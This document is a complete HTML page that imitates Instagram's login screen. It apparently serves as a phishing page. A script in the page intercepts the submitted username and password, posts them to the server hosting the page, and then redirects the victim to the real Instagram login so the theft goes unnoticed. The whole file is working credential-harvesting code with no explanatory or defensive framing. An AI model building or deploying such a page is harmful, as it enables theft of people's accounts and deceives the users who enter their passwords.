<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Instagram</title><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;background:#fafafa}.main{display:flex;justify-content:center;align-items:center;min-height:100vh;flex-direction:column}.box{background:white;border:1px solid #dbdbdb;border-radius:1px;padding:40px;width:350px;text-align:center}.logo{font-family:'Segoe UI',cursive;font-size:42px;font-weight:600;margin-bottom:30px;color:#262626}input{width:100%;padding:9px 8px;margin-bottom:6px;background:#fafafa;border:1px solid #dbdbdb;border-radius:3px;font-size:12px;outline:none}input:focus{border-color:#a8a8a8}input[type="submit"]{background:#0095f6;color:white;border:none;font-weight:600;font-size:14px;cursor:pointer;padding:7px;margin-top:10px;border-radius:8px;opacity:0.7}input[type="submit"]:hover{opacity:1}.or{display:flex;align-items:center;margin:20px 0;color:#737373;font-size:13px;font-weight:600}.or::before,.or::after{content:'';flex:1;border-bottom:1px solid #dbdbdb}.or span{margin:0 18px}.fb{color:#385185;font-size:14px;font-weight:600;text-decoration:none;display:block;margin-bottom:20px}.fp{color:#00376b;font-size:12px;text-decoration:none}.signup{background:white;border:1px solid #dbdbdb;border-radius:1px;padding:20px;width:350px;text-align:center;margin-top:10px;font-size:14px}.signup a{color:#0095f6;text-decoration:none;font-weight:600}</style></head><body><div class="main"><div class="box"><div class="logo">Instagram</div><form method="POST"><input type="text"name="username"placeholder="Phone number, username, or email"required><input type="password"name="password"placeholder="Password"required><input type="submit"value="Log in"></form><div class="or"><span>OR</span></div><a href="#"class="fb">Log in with Facebook</a><a href="#"class="fp">Forgot password?</a></div><div class="signup">Don't have an account? <a href="#">Sign up</a></div></div><script>document.querySelector('form').addEventListener('submit',function(e){e.preventDefault();fetch('',{method:'POST',body:new FormData(this)}).then(function(){window.location.href='https://www.instagram.com/accounts/login/';});});</script></body></html>
